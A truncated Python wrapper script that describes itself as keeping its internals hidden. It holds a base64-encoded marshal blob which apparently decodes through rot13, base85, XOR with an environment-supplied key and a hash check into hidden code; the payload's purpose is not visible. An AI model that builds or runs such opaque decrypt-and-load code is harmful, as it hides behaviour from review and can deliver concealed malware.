#!/usr/bin/env python3
# ultraenc final wrapper â€” keeps internals hidden
import base64, marshal

DATA = """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DAEIAXIDAAAAYTguAABuS1dQV3ljNnJhYnVWSEg1V0ZSYU0wMXVWRjA1SUpidVZGRUNaUlJnV1JnVkNKOXRYUUlPWUZFWUZHMWluRjQyREYweEYwYjlvM1YwQTBSZ1dSZ1lDS056Qnd1T1lGMUVHSER4QVBBVEVQRDlYSHR1Q1E5TFpIUmdXUmdCQ0tPT0dRZ09ZRkVZR20xakZ5Vi9DS09HSm01SEV2WmpCU0V0RncwYkRGMC9XMEVPWUh1WUZ4Z1NZUU91REYxbkkwNVlFRmpqTHhTV0dtU2VDS1IxVzBqOXBHNGdvUlJoWmFJTEYwSDFBek1PWXhIZktSZ1NZUU96REh4OFkyV09ZeXFPSDBSaExKSHlERjVjRVRFWUVGMUtYdzFrTHh1R0RsdXZXSmdQWEtJQklSNDhYeVJjREY4NU0zSVlYSjhnbkhTV0NQOXZERjlPbjFjT1l6U3lXSFJpRnp1akYwSGdJbGI5cEtFSElIWmJMdklrRHZ5MUd5RUJDUGNFWTBSaXBRcHpGbHlpWUpnT0ZHamlMeFJqVm1jdERGNXVNRklPWlBqNFcwZ1NZSXBkQ0tWa0xTcVFYVFZ6VnhSakZTSGVER09GVkdNT1pTeUpaSGdTWUlwZENLVjZNeU9RWEhrRnBSUmpuMlYxR3dqMUxKZ0hMUTRjb3hTWVlQOGdGbHllcUlTT0ZHNGJHSUV0Q3Z5aERGMHdJRjhoQVI5WUtGUnVWRlNpWXdPT1psOU9BbXlGbjBNUkFJRGFNbHFBbm11Ull5VjJuUkFjbnZibVkyeURNUnRrTG1wakVtWnpwYUlvQUtBcFZ5MDRBSk4xQ1FmZktIY2VEbVdnTFQwM29JOGpBR01KWkhJRURJQU1uenBsTTBWeHBHZ1dwemNHV0taN3B2eVNMSDQvTDBNUURQcW9EbVplQ1FXTk15U1lZM2M2VkZSZFdsVnVWSnlFWEZSYllJOXhWRjA3WHc0dVZGSDlZMEw1V1JBdERGMHhaMFdPWUdxeW94NTFJMVNYRXd4NFh3Z1ZuSUVjRFFrbExRYnlERmtmTFFEdkJHMHpJdlI4Q21SeEIxY1hHeU9UVmxBU0dQUjhDUDB3VkdqL0FsTHVDUThrV1JFTkwycVlWR2o4WUZBUExSYitCbTFIRVJSd1pSSCtJek43SnhiMkdRYitZUzlicEc4N1Z6T09uUTh1REZTR0h6TWRFUnlvSVVTUG9RcUVBUFdER2FJbUVGZ0JwSE53cVA0YUpHTHVvRnlFQkhrb0pHa1FabGY4WnpwenFHSGtEUWNJTUpNYVd5eXpMdlJnWTAxWVZGUmNudkwwRUl5V0t4SXVMUjVtRFQwNElTU1FuR2t0b0c5TVZJQXlEUVNTQlFmdVlHdVhGRlJ1VkZSdlZJcXRuR0hpTDJaaEkwSUxwdjFBVkZnRVdRTzZydlJ1VkZwd1ZGUnVCRnh1VkZBTk1QUnVXRnRoVkZSdVZ4TnVZSFIySFBTVHFHcVBWdjB1RVJEZlhRT1lBdlN2cEpxdlZGNDBNeXR2RDNTb0ZQWmNwek94VkZiNVltVnVWSEg1WEZSaHFST0dWRmt0Q2xMdVlHYnlIUFJ1WHZwd1ZGUmRYUEx1VkZiYlpGUmNuSmdWVm01S3FTV1VEdmNjTUZSdVdGRVJWRlJ1VkpxZW9Sa2JMdlJtV1BEYVdVRUxDVUVUTFIwelYwTjhBS09nRGxXdExsY1JGSkQ4cHhMOURRODFWMVNDbkZ5U0pRZ3JFbFJnWTBFVlZGUmJLeUlPQkhFdVl2NGpER1piREd4elhTeHVWRkh4RmxSdVZGVitXR05nREY1U0pUeGFHUFI0QTJSd0RRa0VaMnVPQW15Rk1scXRLUUQyRUtaY0ZIWnVWRlJ4WnZTVkZhU0lWRlJiS3lNTkIwZ2dweE9VWko5dkV6T0FCUDlWVjJTWHBsUnVXUmptcmFidVZGUnVYRlJ1VkZSYVZGUnVWSkR1VkZSdkMwRTFLSmY4REYweVhJMVZuSUFCcFJ1Y294dWRERjBpQlB1V1pScHVWeEluSVNEakZUYmVXUzgwQkdPb24wTDVZRmdMRlRidk1sQU9ZRzlTRlI0OENJWjFGVGIyQUhxSExSV1lFMHVkQ21nVURGMUdLbDVPWUljZkhSTHpXUU1DRlRiOU1hU1NMUThkQzBSZm8wOGhGVGI5WlRMY1dQU3NDUWduRlRxMVZHajhZRlo5SVJFMEFRZ25GeGdDREZraUdsNGhaRk11cEY0N1oycVRFRjB2V3o0akFHSDhEeHB5Vm04YkVSRHdvSVdURVBrSFpITjdLeE4zRHg5MVozUmlvd3VhQndOMUx3WjREUWttRFBjYVdhRWlWeE1TcUlXVERVV1ZHUDFURUdXbktQWnpIYU9oRHlSeUVtdHZYSEVXb3pwYVhJTitEUWovWEhMeFptUnpYbDRqREdaZ0VGZmRMM1NSWlBnUkJITVJBSURhRVRNalpTSHZEMmtOS1JTdVl3dDVWRlJiS3lJT0FteUZNbDRqSG04akFLSDZZSWY1WkdqdkJsQXFMSGdsRXk4ZklteVRBVU9zWTBTSElhVnZWRlJ1Vkhid0tJNXhLbFJ1V0ZFTFZGUnVWdzRkQ1FMYUN4SW5BVUlNVkd0M0dhRVNMejl2Q1BSdVZGVitWd3g0RUZJYVd5eWxZbEhqWUhSaEVJdXRWSGZ1WUY5REdQUnVYUzVyREo0L1cyOVBHbTVkcEhEaVZKMHdFdlNJTUpEdVlHdTBJbFJ1VkZSdlZ3eU9xR0h2QkhTd1lsU0tMVHgxVjFTTUtSUnZwUFp6WmxXald6T2hWRlJ1VnY5NnJhYnhuSnA0WUZFQkdQOGZBeDVOWEpFVFYyYjlXRlJnREdEMlZIMVlHUlJ1WUhSNUxGVmlWMkVkVkY1MEJtOHVaUk4wTUZNZ0hSZ3hWSHlNVjNadW5TMXJZRlNBRjA4NFl5cVZZMEh3WFAxWEtsU25CYUl3VkpWN0R4NHVZd0VkRFBXc0EyVmpWSGI2RmxMdlhtUmxvUXVpSklPeVYwcDdDMDB2WFNNRUhGUmVKd3lDVkdWakV4UnZFSXVMQnZEeVhKa1pWSHlNWUZSdlhTTUtIbFJoQ3ZNclYxajBBeU54Q0pjQklQRTBGMk1MV0lqZExSOHdEMHV3R1BXWEUyTXRWRmMxWkZEdU1VRC9XdkR5WEtXQVZ6U2FJUmp1Rkl4OFd2RC9HSmdvR1RjSENhSHhDMVI1RFBFb0xQa0JXRkx1SnhadVp2cXhGbEQ5bnlnTlZKdXJXVVp1WndPV012U1dKRzhhVnpJbkR3YnpWYVp3R2xFbm9VU2RXd3F3RHdEdUN6Z2FaUElrRlFBU1ZIcXNMSXFpSEdTcENQTWpwMTVkV2FPMFZ5RHVYMWN2QXZWaVlUV21WRjQwcDBaeXBIdG1FRlNXSFF1bVd3cXdGelp6STB1ellGUmxXMmIxV3ZXbVZtNHVMMmJkQ0ZNTUYyV3VWSE0xcFQweFhSQWpYdnQzTHlSeFZJcXRCeE9abkhMZkd2SXBHMGNVWFNBWm53UnVZRkx1R1BSY25KZ1ZYVEx6TDJrVFh3U2xBSE9sTG15Z0RJV2lNbFJ1VkZSdkN2eC9CSlI3RUljVVlTZnVCUXFFb0hTSEl4UjNWMTFtTDNFT0lHdDVBUlNzRkhWbER6amhIdklQQXY4bFZ2UnVWRlo3SklreUUyeVFHeUhhTVBSdVczQU9FUU5hWUZEZUNIZ3FNeFpscVRXVVZ6OWhJbHFzbnd0MkFIQWJBMTlpVkZSdVZtZ01LU1dsbnhSNFlGOWRWRlJ1VkpXUUltV2lIMERqQXZFc1ZGUnhZbVNURUc1UVh2NGpMVVduQlNBbEd5cVFKSFNoS1JON0JKeDZWeWdnV1J1UEhIRXpZbUx4V0Z4d1ZtNVhJbTVQSEhPenB6cHpwM0lhRHg5RVp6YmZxUmphRG15ZktteUhWRlJ2RTBmOXBSY2hKSEVZSUZMMEV2YmhJVFp1VkZ4d0N5eUhIbHA1VkZSdVZIU1VXRlpqWXhXd29sa3VYMEFob2FXUG4zUmdWeFcxQzJ5c0VSeXhDUVZlRFQ5ak1SUjRYd05iRFFnSEVsU05aMDllSXZSdVZGV09Wd3g0RUZJY012cC9HUk1MRkY1YlZGRVZFMjVRR3g4NEFIVjBLVUlNRXhEbUMwMDZaR3R1Rnh1VW9GdGVMUUFRRWxBdFowTGZuVE5tRXdWekVRdXRLUkVlcHlra0VsUnlESUx6VklxS1psWjlwUlZlbjBPbENtRGlNbE0xQUZnVFh2MGVEeE10SXZqM0MxeHVIMklORW1TZ1ZITVFNd2prRUlnUUx6RHVZR09aTWxSdVhTNUlFRjFuSFI5U0tQSGtudlJkSVJjUEVUcGZEVGNRbkdrem9SQWJLUVpmQ0tPWEhTSVJZd3BtcDBTc0ZHdTBEUWovWEdwd0tKZmRZeEhnWVRMbERJOVdCRjlQb1A1VUJQQXFubGJoREo5a0xGdU9JUk9lSEZSdVhTNUhEU3BnREhWeVZGazFxUlIzV21TdkV2eTBMbE1PSzB4OFkwQWJBbU9tWXdTUERKV1JGYUF0WDBNdEtsMVdWdmNYQ1RxYVd6Z2JwMFdPWHhmekVSYnVuUk51TVBNdG9QRHdKU2ZkQzF5ZEpUY05CMGdtQkZSdVZGQUVWMFNnb0pxU1gzWm1XeEluQ3ZNblZGY0hIUldOQnhJeUxHMWpZM1NhRXhIa0cyeVNZVDlQQVE5TVZ3dHVXR05nREY1U0pUTnVGbFJnWTFPWlZGUmJLeTVSRmFBS1p4U2hMenFtQzF5ZEpGU1NXdjVXb2xSZ0J2RTFWRlJ1VkZad0hJeXBERkRtQndWaVhHOVBwMFJ1STJ5MUJQRG1CeEQ0VklxdENscHVJMk4vV2xTS0xSVnVWYU8wb3hWeFptYjRaRlNLTEhjVlh5cW5weUxkSTFmY0p4SXJLS1poVkd0M0lVRVREMFZtWmw0aloxRUxEVVdWQVBFTkIxMUlwME96SnlSanJhYnVWR1pnVmxSdUVHeHlWRnRnSzJEdVlHdTBJbFJ1V1I4a0ZHTnZFSnlIRUdPU0MwWmFXdmtERlR5cW8wVnVDUTlMWkdnbkZ3TVhCd0FWV0ZmdVZGQWxZMEFhblFOYlgwNDVwVE9QSEhPYVhIV3dwVVMwRXhBUEZRV3RaMEFWWFNEMEdKSUREMnRoWHZXTkNUajZXSEFhblFPYkQwSUZDbDlKTUhqd25tOWhKeVowRXhFRG9QY05DUTgwV0hFUEhKMHlEM1Y4WTE0aUR2V3dZbDlPb0tJaUQwa2pvVVdWVktIdkRGNGNJMGYyRVJING92a09JRjgwQVNEMUJTdHhMUVo5Q1B5TkIxMUNwMEF2WTFOaEVKV3pBd1poQVVFbG8wV2ZXR2tpRUpXSER2a09JUkVZWUhPUk12U29EUWdOVkZXc29QSG1NUGdRRlRjUkV5NXpFRklTTHlBMW9tOWhDUkw1RFFnaUpVQVJZdjRtV3hXMUMyeXNFUldCQ0c5VExQeDREME9LSEZIdkR6YzBKUzBpTVRWL0t4RGhZek4xRWxId1pQQVRFU09CWTBXZkExcGdEdzVzWTNJUll5V1lYeFcxQzJ5c0VSV0JDRzlVV0ZaalYwTVJIUjRpQzIwYUxQcVZBMmpqVnhJcW54WnpWRjBrQWxwdVZGdXJJSE9rS0djZ01sTXZxRlJoWlJSbVhSRGdEUEV0RTExb3BtdHVWRlJ2Q3ZIallIUmhFSXVjVzBqdUJRcWRXeFNHcUZFd0UwT3ZJUEFSTXZwem5QUnVWRlYvVnd4NEVGSHVWR1o1WHhJc0MwVjBWRmNITHg5T0lTTXVZUk9qcDB5aEVUTGpXSkE2cnZSdVZGUmNWRlJ1VkYwdVZGUnVNUFJ1VkZWL1d2MGxMd1dWbklXZ0tIWnpwSnlVREYwaEsyZ1daUFdTbjB1Y0tUYndERjAySVJ5U0tRZ1VCSUVTRjFxUERscU9DeU1PWUhTR1lGUjhDMXRrQjFjWkN3QU9ZSVdwTUh1Y0oyU01YRkR4Q1FTT1lJa3lZbU1jSzJ4L0ZHTmVGMmtWbkpJaldSUmdBeUVXRUpWNUQzU0hFSGdLRHhaYURHNUpERjF5bm1SdUNROUxaR2duR1Q1TkZUeXlwUEVPWUdNSEdISXhFRmIzREYwbUtSa1JDbTArSVJ4akFUeTFERjB1SFJjV1pRMWpWSFJncG1TR0ZHT1RLS0VWbnZnZ1Z4dWRWbHBiRkdPRFdscVRaUzFmbklFU0YxcVBEbHFPQ3lNT1l2amJBUFI4QzF0a0IxY0FaSGtPWXdOOUlIUmhCSEFKRkdPTVlGcVZudldhVkh1ZENHT2ZERjVEWkdNVEJKa21wUnVjSHoxdkRscVlCemYwQkdPV1pITDVvSGp2VkdrTlowRUhFSGdLRHhaYURHNUpERjVMWDJrRk14dTBaeHVkVjI4OURGNXVaSmdGTXh1MFowdWRDbGtOREY1MEdROUhMU04xcFJSZm8wOGhZd1YxSFJSdUNRamRWdjRqQlAwaEVQNGhKbVNTWVF4MlpISU1ZbXlDVkYxWkRsdHVWRkFuQTBBY1ZINTBMUUFUWW04ZUQwdWRFUlNISXpSZkRVT21GSjVSTXYxcUJJeXBLbUVIREhrME1QdVFMd0FYbzBBYm9JRGNZdnlLS0dNUUdUNUtZUkhnVjJOOUVUTGpZRkxoQnc5S01VYzZWRlJ1VkZadVZGUnVXRlJ1VkZTMFZGUnVWdzhhRUhSZUFIVmNvR2duQ3oxMVlTNVZuSTFmQzFFdERtV0pFR2tZWnc5U0pUTnVGbFJ5RFVaelZ6T2hNUGdQb1JxWld6cHpMVGtwTWxNblltSHlaUDFPWXhJTExQU1lWRjBpSFJqdVZGdXJKbUVSS1M5RUV4QUhBdmdTVzBPaEFsUnVYSUVkVkZSdVZ4TGVFSDBlQkc5TW55dWREUWovQVBJUkVQVnlNeEV5VkdBZkV2RDdabTFRblNnbUFST2xGUURhQUdJVUJ3V1RJemZjSkZSYkQyQVhEUWttV21xTUtTODBJUlNZSnY4Z1gwNGtHUFplRVFJUllsOWluVERpVkZSeVdROHVWRlJ2REdPU0JsdUVCR0l5S0pjUldtWjdaSEFjcDFwYkVQNGdxVDVNbzI0OVZsZ1FvejRhQUtINllVU1BHMVJ1bjBMbEpHMDVYMFIySTJjVEVHVjdCRmdSVjF1V0VJZ2tYMnh1WUdPSW52UnVWMGI3VnpPdkZJanVWRkh4SmxSdVZGVitYRzg1TEdnU0tQSGtudlJnWlI5YlZGUnlZSVp1VkZSdW9SRXpaUzAzWDBBSEhQdVNMejhqV0hTT24yTjJYMUFmWUpiZUV3RDFBbDFsTEhSbFgwSXBubDR1VkZXVlZsZ05CSkVNREd0Z1czSVJZbWt4WFBnUkZ6T2VEemoxV3ZEakF3ZjRFeExiQkdMY0RTTHpwRlZoWkcxY0FSTVFNeTA5TWxwY0hRY1FuU2p2RXZWY0dIOXhFSTFkRGxMdVlHUjNXbFJ1V0ZIa1ZGUnVWdzQ0RlF1c254SW9LYUVhVkYwanAzRHVWRnVySVJMZFhIcVFYUHB2Q0dwaFpVQWxNUFJ1VkZBRVZ6T0ZvSmNURUc4aENSQWNDVHBiWEc4NUxHZ1NKeHBmSmxSZ1kzU0tWRlJ5V0ZmdVZGUnZDd01CRFB5eEVJdXRWSGZ1WUY5QUZsUnVXRkVaVkZSdVYxUnlWRjB1V0c5TW55dWREUWovQVBJUkZISUFFdlJnQklJY1ZGUnVWRlp5RjFTMENGTGdaejQzWFMxdldScHpZR1doQWx1cUxKMVFWMVNNQ3dwdkJIVnpBbFY1REo4MFZhTnZvUGZ6TVA5V0RSSXVXeDFSVkZjSEtSMVRLek1TV0hJdkgzSWlEVE1uSEdPNnJ2UnVabDB3VkZTU0JGSHVYUDFzTVBSZ0JhWjZWRlJ5WHhPVm5JV2dLeFphV2xXYUZHTnZLS1dUQkc5b01ISW9KdlowSVJJSEtIQVFXYVZ6R3hSZ1d4UmRWR2ovSlFSN0p4aitaUkw1QzIxZVhGRHZaSGowQkdPV1lITDVEUDFsVkdrTlowSUhFSUVxRDBaenB2TUJERjFPSGwwdUNROUxaR2duRndNQUJ3QU5KeWJ1VkZxald4RVdKbUx3QzI1bkhtRVRFU09mWHhOOENtRHlFUng5SVBFUW5RRXNxUnR1cVROakRRRWVHdlZoRjBXVUYwdDJDYUFlRVA0aExRSU5JeGdMblJXZkozTmNEMnQzSlBEZUQxRHpZSFdlREhmdURHdGZuemNQTUhBYkN4SXRMUWdPVkYwa0lHUnVWRkh5WnZSdVZGVitadzhtS3lxU0tKY1FXdlJnWkdwYVZGUnlXU0R1VkZSdnFGU3dNMjAxVkZSeVdGeHVWRlJ2Q3ZIallIUmhFSXV0VkhmdVlGOURHUFJ1WFM1TERVVjFMSk9UWHdTbENQUnVWRlYvV0hnVkZ2OHVWR0FFWlBBRUpIYjdWd3lPb21ad0hJa21HbFJ1VkZWeldTZnhDbDVUS3pNU1dISXZIM0lpRFRNbkhHTzZydlJ1Wmwwd1ZGU1NCRkh1WFAxc01QUmdCd3B6VkZSeVh4T1ZuSVdnS3haYVdsV2FGR052S0tXVEJHOW9NUklvSkh0dUV3eC9vSmZjV1BWa0ZtRDVaUnhlRXd5TllLVnVDUk5tRXlFU0tKQVJEbE1sV3g1T1lHdUFZUFI4QzF0a0IxY1hBeGo2WXhWM0h2UnVWRldPWFMxTEdteDJDd2IzRlJXZkozTmNEMnQzSW1PUUdSMGpueE1BcVJwd0RIU2VMUGJoWlRjZnBGUnVWRlYrQlBrbEl6eVNLbDAyWnZSZ1pVQTBWRlJ5V1NEdVZGUnZDd0VIRTB1ckVJMW1GRnB1WUdWOEVGUnVXRkVZVkZSdVZ3NHlaUDFPWXhJTG5GcVpWR3QzTFR1Ull4eHVweEVZRGFWakYwSGJxSU9TcDE5Z0ZGUnVWRnBpVkcwaUtHcHVDRjlyRlE4bHAzWmRDS09IQnlnUUdIT2dZUlNIRVF1cXJhYnVWRlJ1QlBSdVZGUjFWRlJ1VkpEdVZGUnZDbWJhWFJBa0RGMHhaME9RS0hjZUxIUmdXUUFQRDExR0RJQVdaUHFTR1JMNUMyMWREbHA0QlNFWVhLT1BXeEw1S1JXUUZUeWpXeEFXWlExalYwTHhMS0FHSVJMd3FIcVFXbXQ0SVJSZ0JSMGZWR2ovSlFSN0p4a2hGUnVkVktBc1hGRHdXVElPWUhJYkd4dWRXUHlXREYxR0tsNU9ZSWNLR3g0OEV5eDFGVGJlSG15VEJKNUJFMHVjSHoxdURscU9ZU0FITFNOMXBSUmZvMDhoRlRiZVdUTGNXUFphblJ1ZEFQY2JYRkR3VzJ5Vm53RGRuRnh4VmxxZEZUYjBYemJjV1BaYW4wdWRBUGNlWEZEd1cya1Zud0Rkb1B4eFZscWdGVGIwWHowY1dQWmFveFJoTEdTZkRGMDhMeDFGTXh1MFowdWRXUHlXREYxRUhJdUhMU0lwTFJSaG53cWdERjFTblI1Rk14dTBBSHVkQ2xrTkRGOGpGS0VGTXh1MEEwdWRIR3VQREY5UEl2QUZNeHUwQkh1ZEwwRVJERjlITHZxRk14dTBCMUFYWUhFcEV3eWhHeHFWbklXZ0xIWmFES0VpSVRPREFLT1ZuSWdtbkh1ZFhsSHZERjlpWVBBQkNRMUdDSHVjTUlmZElSTCtDMU9ITFJnd0ZSeGtGMmJrRlRmakhKNVRCSjVCR1J1Y0h6MXVEbHFPcVVTSExTTjFwUlJqQ3hEZURHT0RIUDlPWlRXcFowUmpxVHQzREdSa3FRZ09aSERlQzBSa0l3cVFER1NiRDBxT1p2SUNGMFJsQTFnQ0hsNWFCMTVPWnhjbkJ4UmdDVFdBSHpNVnFTTVZudlNtTFB4eFdQMGVER1dxcVM1V1pJNUVaMFJsTUZFTUZsYnZFeE4vVzBndUdITDZYeFcxREYwOEx4MVZudlNtTFB4eFZsRXlJUkl6VkdBSExSZ0JIeFJnTUY1MEZHU2pxSFNDQkZxVEJSODVXbTlzRlRnSVYzRGNXUFpiVkh1ZUIzU0lGVGdZcDAxSExTRUtJMHVlRHoxQUZUZ0FveGdPWm1IaUh5V3pGVUVxRlRnclh2UmNXUERnWDBSaVpSYmVERjRqQ0lJRk14dTBBMHVlS3Zid1hGRHhZRmdPWTBXSllIUmhEeHlLSHpNVnFReVZuMTRkV0Z4eFdQMGVERjlITHY5T1l5RUlKSVd6RlVFS0gweWdNU2tXWkk5RERISVlFMU9aRlRnU1Z5Z09aUDVTRXhmY3BSVjVER0FVQjFIL0cxOGNLMUVUSEc1WkRscDRCU0VWbjNXUUlsUjhDMXRrQjFjWEFtUjZabEVOQlBSdVZ4cVlNbHA1cHp5VEQyTUFMd2NCS1VIYlZGUmFwUE1SRklmMlZtOWhKeVowRXhFRG9QY05DUTgwV0hFV0NJRHhEMnQwSzNFVlZLRXNCSHR1cVN4M1lKNXpKU1NURVNPZlh4TjhDbUR5RVJXQVcxa0hBUjFwR0hJcXFTSGhLMjQ1TXZFT0d6dUNwSEluVnp5S1ZGMGlxU3R1VkZIeEpsUnVWRkF0V0dOZ0RGNGhaUUVWWXZSdVZGV09XMk9wQVFMOExKTXdKUk1SSFI0aVgwQUhYdnluVm1BMU1ITjZKbWtxWTI5Y0d4RHVWRkh4b1BSdVZGVnpWbThmTHk5U0x5RUhYMElwRFJBZ1ZGMGpMSjR1VkZIeG9sUnVWRlYrWkZNa0J5QVRJYURpSnZSNkp5TVVHdkRib1B1Ull2NXRBR2t1TXpBTEV4RURHdjlQTDNJUkwxT0hKRlNVVkZSdVYxUnVZSGp1cHZSdVZHOUdCSmdPRUlnUk1GcTBFd1NTTHlqZ0hTRUtweEFxSEY1eVdIdHZERmN4RHoxVFlGeU9JU0VOWXZFWm55Z1ZId1o1RTFPUlpQcGdXUGYvRDFxeld6QXNvd1p4RjBPVVcyNHhveEh4QlBNQXFJcU9LR2I0TEdBbnB5T0pWRlJ1VkZnaENJTzFCUGdCVzAxdElRSDRXMTBlQzBBS012SXpMMVpqV1JrZEowdVpFSDlDQ3hBQURTY21Eek1vRElieU16QUdaUEVabnlnVkdQYmlMM0V0R1RxRklGZi9EMXF6V0pNd0htTnhHVGNvRlI0eFhHdG1FeEgrRGxiZUMwQU1WRlI5RVFmNld4dVJNR1dTSkd0L0hQUmdZbUlRVkZSeUNTZ1VXRlpqVjBNUkhSNGlDMXh1bjNXTkIxMUxxRjlpVjB1VUVSamRKbVNSRncwNVh4SXdKS1Y2RTNOeVdRZmVERkVLbnhON0lTNWFYMFZjTDJTT0gzSHVuUkx2REhwZkRRamZNVEVQSFJFd0NtdUhIMTFKRVA4dUZsTDdNdzhpSjBTSEltVi9FVEg2WDJJUk15RWxBRmdOWlRjSUVKV0hWMmplQ0hnekptYmdNbTFIWEZqMUFhT1FuU2d0WW0wY0lsZ2tER045SElxTkJhQXJvbGY5RjNXd0JIeU1CRjg4RTJBRnBITjdGSDFnRXpPWm93SDhFMmtBbzBTSEVUYmVFeElpRVNmNW5hU2FISE43VzNaMEFtZnhvSldURVFIaldQZ05NbFNwRElFUlozUmVEUVJnb1JXRVdLTmRFeElpVkh5T01hRHdwUkl3cUZaK0ZRcXNLdmdUWHZ4ZkNSTXRLbVI3RVRINlgxNU9JUHlDV1J0d29JampFdldPRW1NUkZ3MDVYeEl3SktWNkUzTnlXUWZlRHdXaUwwSXVMVGJtV1NMZkN5SU9NYUExSzBWMVhHYnlDS09OSTBXVURRNG1ZRzFqQTJabUV4QVBabXhnSXlqd0xIQWJKM1YxQ1JwZkxTcU5aMFJnSzBBYW5RTmFCMklyWVM1TkIzT05aUk4wSTA4dkR6ajNISmtTWVNFd1l4dDJMMGpoRHprTm9RWjZHeFpjSXhFWENISGRFeEQxSndWZUVScWhBSE43SVM1YVgwQWlXRmYzSTAxaklST2tEekQ2VkZSdVZKSVBvSExnWEhTSElQcDFKSkxtQUg1T0lSRVlZR0w5RkpiZEQwa0FYYUF0WjB4M0hKTm1EMmI1Q1AwOEFVQU9JRmtTTXlENFpVSVZJUXRqb3ZIaUhHTUpXeEl2SVNwOERRZ1dXeU9PQlNSeHFIV2ZNSFY2RFFqL0FQSVJEeDVlWlBnT0ZGUnZEMnVvTEYwZUVGdWRBbWdZSmxMeUR6Y2ZDUVI1b1JNbE14TGJvbXh3RXhEMUlsYmVEUlphTEhEaVZ2YjJESVcxcUpBUk15RW5YSHFPWklEdUZRRHVXeTlOSUlxMFdGZ1BCeTFsRlFFQkl3TDVaSTljWWxnT0ZReXBEUWtmcFA1TkJINWVXSEl3b1F0bER6MVpEMldPSDJqdXB4TjZwRmoyQlNEelcxcVJGSjFnVzBONUd6NGtFVE1ITGxnTnB4SXlaUklzRlJ0MVZGMGlKSDh1VkZ4MkxsUnVWRkF0Vnd4NEVGSWVvVHR5TUZSNW55NWFWRlJjQXp0dVZGUndMUEFmbmFWZEVJY0RaeWp1QkpjZG5sUnVYR01mVkZSdVZ3NC9uSUhqWVRnZ01TZ2hWR3llVko4dVZGeDJwUFJ1VkZBdFd4dVJNR1dlb3dBbXB2UjVubDFtVkZSY0FhRHVWRlJ2REdIMlhTY3RvdzFEb21SZURJUi9LeE44cGxJbURRZ1BIbFNRblFxTFdQZ09BdjF0TFJrZVhJV1FNMmY3SVJNQXFScGNFUDRlSFF0NW4wU1NKMEV5VzNFVG5KRXhBUmJqRklnTkZ5QWhaeUFaRUkxRENKWnhabVJ6WGxnVEVta1pIbXQ3cVNObUphV3NHRkQ